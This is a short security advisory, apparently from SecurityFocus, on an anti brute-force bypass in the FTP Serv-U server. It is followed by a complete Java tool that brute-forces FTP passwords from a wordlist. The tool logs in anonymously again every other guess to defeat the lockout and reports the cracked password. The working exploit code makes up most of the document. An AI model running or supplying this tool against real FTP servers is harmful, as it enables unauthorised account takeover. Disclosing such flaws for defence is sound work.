source: http://www.securityfocus.com/bid/1860/info

FTP Serv-U is an internet FTP server from CatSoft. 

FTP Serv-U contains an anti brute-force security feature which does not indicate whether an account is valid or not, after three unsuccessful login attempts a user is disconnected. Reconnection is not permitted until after a specified amount of time.

It is possible for a remote user to bypass the anti brute-force function within FTP Serv-U. Once successfully logged into the server either anonymously or with a valid account, a user can from that point brute force other usernames and passwords without ever being disconnected. 

This could lead to a compromise of other user accounts on the ftp server.

import java.io.*;
import java.net.*;
import java.util.*;
public class newftpbrute
 {
	static boolean cancel=false;
 	static boolean found=false;
 	
 	static String File;
 	static String User;
  static String line="";
 	static String FTPPass;
 	static String Server="";
	
  static int Counter;
  static int tries;
  
  static BufferedReader quelle;
  static DataInputStream sin;
  static PrintStream sout;
  static Socket s = null;

	
	
	void getdata()
 	 {
 	 	try
 	 	 {
	 	  System.out.print("FTP-Server>");
	 	  DataInputStream in = new DataInputStream (System.in);
	 	  Server=in.readLine();
	 	 
	 	  System.out.print("Username>");
	 	  in = new DataInputStream (System.in);
	 	  User=in.readLine();
	 	  
	 	  System.out.print("Wordlist>");
		  in = new DataInputStream (System.in);
	 	  File=in.readLine();
		  System.out.print("\n"); 
		   try 
		  	{
		 	   quelle=new BufferedReader(new FileReader(File));
		    }
	     catch (FileNotFoundException FNF){};
 	 	 }
	   catch (IOException e){}
 	 }//getdata()
	
	
	
		
	
	void connect()
 	 {
 	 	try
 	 	 {
 	 	  s = new Socket(Server, 21);
	    sin = new DataInputStream (s.getInputStream());
	    sout = new PrintStream (s.getOutputStream());
     }
 	 	catch (IOException e){}
 	 }
	
		
	
	void CheckForAnonymous()
 	 {
 	 	try
 	 	 {
 	 	  boolean NoAno=false;
 	 	  
 	 	  sout.println("USER anonymous");
 	 	
 	 	   if ((line=sin.readLine()).indexOf("331")==-1)
 	 	   	NoAno=true;
 	 	   
 	 	   while (true)
 	 	    {
 	 	     if (line.indexOf("220")>-1)line=sin.readLine();
 	 	     else break;
 	 	    }
	     
	     
	    sout.println("pass evil_hacker@j00r_server.com");
	  
	     if ((line=sin.readLine()).indexOf("230 ")>-1)
 	 	    {
 	 	 	   System.out.println("Anonymous access allowed...");
 	 	     NoAno=false;
 	 	    }
 	  
 	     else
   	    NoAno=true;
 	 	 	 
 	 	 	 if (NoAno)
 	 	 	  {
 	 	 	   System.out.println("Anonymous Access not allowed...quitting!");
 	 	 	   System.exit(0);
 	 	 	  }
 	 
 	 	 }//try
 	 	 catch (IOException e)
 	 	 	{
 	 	 	 System.out.println("Error Connecting:"+e+" quitting...");
 	 	 	 System.exit(0);
 	 	 	}
 	 
 	 
 	 }//CheckForAnonymous
	
 
 
 
 public static void main(String[] args)
	{
 	 System.out.println("NEW type of FTP brute force\nCoded by Craig from [ H a Q u a r t e r ]\nHTTP://www.HaQuarter.De\n");
   
   newftpbrute now=new newftpbrute();
   now.getdata();
   now.connect();
   
  try
   {
   
    if ((line=sin.readLine()).indexOf("220")==-1)
		 {
		  System.out.println("Error...ftp server sends unexpected input");
		  cancel=true;
		 }
   
     
     now.CheckForAnonymous();
     
     while (cancel==false && ((FTPPass=quelle.readLine())!=null))
	    {
       Counter++;
       tries++;
       
       System.out.println("#"+tries+" "+FTPPass);
       sout.println("USER "+User);
       
       if ((line=sin.readLine()).indexOf("331 ")==-1)
       	{
       	 System.out.println("Error: username not accepted...quitting ");
         System.exit(0);
       	}
       
       sout.println("PASS "+FTPPass);
              
	 	    if ((line=sin.readLine()).indexOf("230 ")>-1)
   	     {
   	      found=true;
   	      break;
   	     }
       
              
	     if (Counter%2==0)
	     	{
	     	 System.out.println("-");
	     	 sout.println("user anonymous");
	     	 line=sin.readLine();
	     	      	 	
	     	 sout.println("pass evil_hacker@j00r_server.com");	     	 	
	     	 line=sin.readLine();
	     	 	     	 
	     	 Counter=0;
	     	}
	 
	    }//while
	      

   if (found==true)
   	System.out.println("\nAccount was cracked after "+tries+" tries. Password for user "+User+" is \""+FTPPass+"\"\n");
   
 }//try
 catch (IOException e){}



}//main
		
		
		



}//class
              	